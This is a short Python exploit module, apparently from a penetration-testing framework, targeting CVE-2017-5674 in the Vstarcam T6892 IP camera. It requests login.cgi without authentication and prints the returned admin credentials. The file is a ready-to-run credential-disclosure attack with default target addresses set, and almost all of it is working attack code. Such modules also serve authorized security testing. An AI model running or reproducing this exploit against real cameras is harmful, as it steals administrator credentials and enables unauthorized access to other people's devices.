#!/usr/bin/env python

import socket
import httplib
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_vstarcom_ip_camera_info_disclosure"
INFO['DESCRIPTION'] = "Vstarcam T6892 Information Disclosure"
INFO['VENDOR'] = "http://www.vstarcam.com/"
INFO["CVE Name"] = "2017-5674"
INFO["NOTES"] = """
    Vulnerability allows to get admin credentials.
    """
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG']="13 Apr, 2017"
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.42"
OPTIONS["PORT"] = 81


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def run(self):
        #Get options from gui
        self.args()
        self.log("[*] Connecting to %s:%s" % (self.host, self.port))
        h1 = httplib.HTTPConnection(self.host, self.port)
        h1.request('GET', 'login.cgi')
        r1 = h1.getresponse().read()
        self.log('[+] Admin credentials are:\r\n%s' % r1)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
